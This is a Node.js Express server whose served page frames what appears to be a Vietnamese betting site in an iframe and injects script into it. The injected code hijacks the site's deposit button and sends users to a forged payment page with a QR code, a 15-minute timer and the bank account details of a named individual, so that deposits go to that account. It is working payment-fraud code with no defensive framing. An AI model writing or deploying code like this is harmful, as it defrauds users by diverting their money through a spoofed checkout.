const express = require('express');
const app = express();
const PORT = process.env.PORT || 3000;

app.get('/', (req, res) => {
  res.setHeader('Content-Type', 'text/html');
  res.send(`<!DOCTYPE html>
<html>
<head>
  <meta charset="UTF-8">
  <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
  <title>f1686s.com</title>
  <style>
    * { margin:0; padding:0; box-sizing:border-box; }
    body, html { width:100%; height:100%; overflow:hidden; background:#000; }
    iframe { width:100%; height:100%; border:none; display:block; }
  </style>
</head>
<body>
<iframe id="mainFrame" src="https://f1686s.com/home/mine"></iframe>
<script>
(function(){
  console.log('✅ Script bắt đầu chạy');
  
  const BANK_ID = 'MB';
  const BANK_NAME = 'MBBANK NGÂN HÀNG QUÂN ĐỘI';
  const ACCOUNT_NO = '757526789';
  const ACCOUNT_NAME = 'NGUYEN VU DAT';
  const patched = new WeakSet();
  let redirecting = false;

  function randomTx() {
    const chars = 'ABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789';
    let code = '';
    for (let i = 0; i < 5; i++) code += chars[Math.floor(Math.random() * chars.length)];
    return code;
  }

  function buildPage(amount, txCode) {
    const amountVND = amount.toLocaleString('vi-VN') + ' VND';
    const qrUrl = 'https://img.vietqr.io/image/' + BANK_ID + '-' + ACCOUNT_NO + '-compact2.png?amount=' + amount + '&addInfo=' + txCode + '&accountName=' + encodeURIComponent(ACCOUNT_NAME);
    return '<!DOCTYPE html><html><head><meta charset="UTF-8"><meta name="viewport" content="width=device-width,initial-scale=1.0"><title>Nạp Tiền</title><style>*{margin:0;padding:0;box-sizing:border-box}body{font-family:sans-serif;background:#fff8f0;padding:20px}.box{background:#fff;border-radius:16px;padding:24px;max-width:420px;margin:0 auto}.qr{text-align:center;margin:16px 0}.qr img{width:200px;border-radius:8px}.info{background:#f5f5f5;padding:12px 16px;margin:8px 0;border-radius:8px}.label{font-size:12px;color:#888}.value{font-size:16px;font-weight:700}.red{color:#e74c3c}.timer{color:#c0392b;font-size:28px;font-weight:800;text-align:center}</style></head><body><div class="box"><div class="timer" id="timer">15:00</div><div class="qr"><img id="qrImg" src="'+qrUrl+'"></div><div class="info"><div class="label">Số tiền</div><div class="value red">'+amountVND+'</div></div><div class="info"><div class="label">Ngân hàng</div><div class="value">'+BANK_NAME+'</div></div><div class="info"><div class="label">Số tài khoản</div><div class="value">'+ACCOUNT_NO+'</div></div><div class="info"><div class="label">Tên người nhận</div><div class="value">'+ACCOUNT_NAME+'</div></div><div class="info"><div class="label">Mã đơn hàng</div><div class="value">'+txCode+'</div></div></div><script>let s=900;setInterval(()=>{s--;const m=String(Math.floor(s/60)).padStart(2,"0");const sec=String(s%60).padStart(2,"0");document.getElementById("timer").textContent=m+":"+sec;if(s<=0){document.getElementById("timer").textContent="⏰ HẾT GIỜ";}},1000);</script></body></html>';
  }

  function doRedirect(e) {
    if (redirecting) return;
    redirecting = true;
    e.preventDefault();
    e.stopPropagation();
    const input = document.querySelector('.ui-input__input');
    let points = input ? parseInt(input.value) || 0 : 0;
    let amount = points * 1000;
    const txCode = randomTx();
    const html = buildPage(amount, txCode);
    const blob = new Blob([html], {type: 'text/html'});
    window.location.href = URL.createObjectURL(blob);
    setTimeout(() => { redirecting = false; }, 1500);
  }

  function patchButton(btn) {
    if (patched.has(btn)) return;
    patched.add(btn);
    btn.removeAttribute('disabled');
    btn.classList.remove('ui-button--disabled');
    const clone = btn.cloneNode(true);
    clone.removeAttribute('disabled');
    clone.classList.remove('ui-button--disabled');
    clone.onclick = null;
    btn.parentNode.replaceChild(clone, btn);
    patched.add(clone);
    clone.addEventListener('click', doRedirect);
    clone.addEventListener('touchend', doRedirect);
    console.log('✅ Đã patch button');
  }

  function findAndPatch() {
    const frame = document.getElementById('mainFrame');
    if (!frame) return;
    try {
      const doc = frame.contentDocument;
      if (!doc) return;
      const btn = doc.getElementById('depositSubmitClick');
      if (btn && !patched.has(btn)) { patchButton(btn); return; }
      doc.querySelectorAll('button').forEach(el => {
        if (patched.has(el)) return;
        if ((el.innerText||'').includes('Nạp Tiền Ngay')) patchButton(el);
      });
    } catch(e) { console.log('Lỗi find:', e); }
  }

  // Inject script vào iframe
  function injectIntoFrame() {
    const frame = document.getElementById('mainFrame');
    if (!frame) return;
    try {
      const win = frame.contentWindow;
      const doc = frame.contentDocument;
      if (!win || !doc || !doc.body) return;
      if (win.__tm_loaded) return;
      
      const script = doc.createElement('script');
      script.textContent = '(' + findAndPatch.toString() + ')();' +
        'setInterval(' + findAndPatch.toString() + ', 500);' +
        'window.__tm_loaded = true; console.log("✅ TM đã inject");';
      doc.body.appendChild(script);
      win.__tm_loaded = true;
      console.log('✅ Inject thành công');
    } catch(e) { console.log('Lỗi inject:', e); }
  }

  // Chờ iframe load
  const frame = document.getElementById('mainFrame');
  frame.addEventListener('load', function() {
    console.log('📄 Iframe đã load');
    setTimeout(injectIntoFrame, 300);
    setTimeout(injectIntoFrame, 700);
    setTimeout(injectIntoFrame, 1200);
  });

  // Chạy lặp
  setInterval(injectIntoFrame, 2000);

  console.log('🚀 Cloud web đã sẵn sàng');
})();
</script>
</body>
</html>`);
});

app.listen(PORT, () => {
  console.log('✅ Server đang chạy tại port ' + PORT);
});
